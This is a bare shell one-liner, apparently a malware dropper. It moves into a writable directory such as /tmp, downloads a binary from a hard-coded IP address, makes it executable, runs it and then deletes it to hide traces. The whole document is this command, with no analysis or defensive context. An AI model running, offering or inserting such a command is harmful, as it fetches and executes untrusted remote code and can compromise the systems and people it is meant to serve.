cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.97.112/'[CPU]'; chmod +x '[CPU]'; ./'[CPU]'; rm -rf '[CPU]'
